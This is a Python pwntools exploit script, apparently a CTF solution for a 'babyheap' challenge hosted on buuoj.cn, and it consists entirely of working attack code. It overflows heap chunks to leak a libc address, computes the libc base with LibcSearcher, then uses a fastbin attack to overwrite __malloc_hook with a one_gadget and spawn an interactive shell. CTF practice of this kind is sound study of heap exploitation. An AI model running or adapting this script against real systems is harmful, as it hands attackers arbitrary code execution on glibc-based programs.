from LibcSearcher import *
from pwn import *

#r=process("./babyheap",env={"LD_PRELOAD":"./libc-2.23.so"})
r=remote("node3.buuoj.cn",26679)
def alloc(SIZE):
	r.recvuntil("Command: ")
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(SIZE))
def fill(ID,CONTENT):
	r.recvuntil("Command: ")
	r.sendline("2")
	r.recvuntil(": ")
	r.sendline(str(ID))
	r.recvuntil(": ")
	r.sendline(str(len(CONTENT)))
	r.recvuntil(": ")
	r.sendline(CONTENT)
def free(ID):
	r.recvuntil("Command: ")
	r.sendline("3")
	r.recvuntil(": ")
	r.sendline(str(ID))
def dump(ID):
	r.recvuntil("Command: ")
	r.sendline("4")
	r.recvuntil(": ")
	r.sendline(str(ID))
	r.recvline()
alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4
alloc(0x10) #5
free(1)
free(2)
fill(0,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x20)+p8(0x80))
fill(3,p64(0)*3+p64(0x21))
alloc(0x10) #1
alloc(0x10) #2
fill(3,p64(0)*3+p64(0x91))
free(4)
dump(2)
malloc_hook_addr=u64(r.recv(6).ljust(8,'\x00'))-88-0x10
libc=LibcSearcher("__malloc_hook",malloc_hook_addr)
libc_base=malloc_hook_addr-libc.dump("__malloc_hook")
one_gadget_addr=libc_base+0x4526a
alloc(0x80) #4
alloc(0xf0) #6
alloc(0x60) #7
alloc(0xf0) #8
alloc(0x10) #9
free(6)
fill(7,'a'*0x60+p64(0x170)+p64(0x100))
free(8)
alloc(0xf0) #6
alloc(0x60) #8
free(7)
fill(8,p64(malloc_hook_addr-0x23))
alloc(0x60) #7
alloc(0x60) #10
fill(10,'a'*0x13+p64(one_gadget_addr))
alloc(0xf0)
r.recvuntil(": ")
r.interactive()
